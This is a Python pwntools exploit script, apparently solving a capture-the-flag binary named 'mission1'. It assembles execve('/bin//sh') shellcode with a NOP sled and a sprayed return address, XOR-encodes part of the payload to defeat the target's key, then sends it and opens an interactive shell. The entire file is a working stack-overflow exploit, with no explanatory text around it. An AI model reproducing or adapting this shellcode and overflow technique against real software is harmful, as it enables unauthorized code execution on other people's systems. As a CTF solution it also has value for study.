
#!/usr/bin/env python

from pwn import *

#----------------------------------
# Functions
#----------------------------------

def xorcode(binary_buffer, key = "BLOCKCHAIN\0"):
	"""Xor ""encription"" rotating the key""" 
        return b"".join((chr(ord(byte) ^ ord(key[index % len(key)])) for index, byte in enumerate(binary_buffer)))

#-----------------------------------
# Constants
#-----------------------------------

shell = "nop\n" * 32

shell += """
xor eax, eax    # Setup the eax to call the sys_execve
push eax
push 0x68732f6e
push 0x69622f2f
inc eax         # 1
inc eax         # 2
inc eax         # 3
inc eax         # 4
inc eax         # 5
inc eax         # 6
inc eax         # 7
inc eax         # 8
inc eax         # 9
inc eax         # a
inc eax         # b
xor ecx, ecx    # set the param to NULL
xor edx, edx    # set the enviornm to NULL
mov ebx, esp
int 0x80
"""

shellcode = asm(shell)

print(disasm(shellcode))

print("[INFO] shellcode len: %d\n"%len(shellcode))

buffer_address = 0xFFFFC748 + 0x40


#----+--------------------------------
# Construct the exploit
#------------------------------------

# Nop Sled
nop = asm("nop\n")

pwner = nop * (4 * 20 + len(shellcode) % 4)


# Shellcode
for _ in range(1):
    pwner += shellcode

assert len(pwner) <= 0x330, "nop_sled + shellcode too long"

# Ret address spray
for _ in range(200):
    pwner += p32(0xFFFFC780 + 0x30)


# Fill the rest to exit the fread
# pwner += EOF
total_input = 0x1000 #1558

assert len(pwner) <= total_input

pwner += "A" * (total_input - len(pwner))

print("#"*40)
print(pwner)
print("#"*40)

#-------------------------------------------
# Bypass the Xor
#-------------------------------------------

# explot that (a^K)^K = a
pwner = xorcode(pwner[:804]) + pwner[804:]

#--------------------------------------------
# Save the exploit
#--------------------------------------------

with open("exploit.bin", "wb") as f:
	f.write(pwner)

#--------------------------------------------
# Execution
#--------------------------------------------

# Execute
r = process("../mission1")

# Send the pwner
r.send(pwner)

# Switch to shell
r.interactive()

